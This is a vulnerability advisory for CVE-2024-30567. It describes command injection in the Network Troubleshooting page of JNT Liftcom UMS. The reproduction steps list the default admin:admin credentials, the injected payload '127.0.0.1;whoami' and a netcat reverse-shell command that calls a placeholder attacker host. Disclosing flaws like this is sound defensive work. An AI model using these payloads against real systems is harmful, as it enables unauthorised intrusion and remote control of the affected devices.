|  | CVE ID: CVE-2024-30567 |
| --- | --- |
|  |  |
|  | Vulnerability Title: Authenticated Arbitrary Remote Code Execution on JNT Liftcom UMS v1.J Core Version JM-V15 |
|  |  |
|  | Description: |
|  | An issue in JNT Telecom JNT Liftcom UMS v.1 Jcore v.JM15 allows a remote attacker to execute arbitrary code via the Network Troubleshooting functionality. |
|  |  |
|  | VulnerabilityType: |
|  | Remote Code Execution |
|  |  |
|  | Vendor of Product: |
|  | JNT Telecom (JNT) |
|  |  |
|  | Affected Product Code Base: |
|  | JNT Liftcom UMS - UMS V1.J Core Version JM-V15 |
|  |  |
|  | Affected Component: |
|  | The vulnerability is on the "Network Troubleshooting" functionality on the JNT Liftcom UMS web interface. |
|  |  |
|  | Attack Type: |
|  | Remote |
|  |  |
|  | Impact Code execution: |
|  | true |
|  |  |
|  | Impact Information Disclosure: |
|  | true |
|  |  |
|  | Attack Vectors: |
|  | Steps to Reproduce: |
|  |  |
|  | Step 1 : Open the JNT Liftcom UMS web interface |
|  | Step 2: Authenticate with the credentials. (Default credentials admin:admin) |
|  | Step3 : Navigate to the Network Troubleshooting option. |
|  | Step 4: In the "Network Troubleshooting" page, there is an input field where we can enter an IP address to check if it is accessible or not. In that input filed enter the payload "127.0.0.1;whoami" |
|  | Step 5: In the response we can the see the result of the command "whoami". Which means we were able to successfully execute arbitrary code on the remote system. |
|  | Step 6: Since the backend operating system is running linux, we can easily get a reverse shell using "nc <ip address> <port> -e /bin/sh" (or we can use any other payloads) |
|  | Step 7: Start a listener on the port used in the payload. |
|  | Step 8: We will get a reverse shell. |
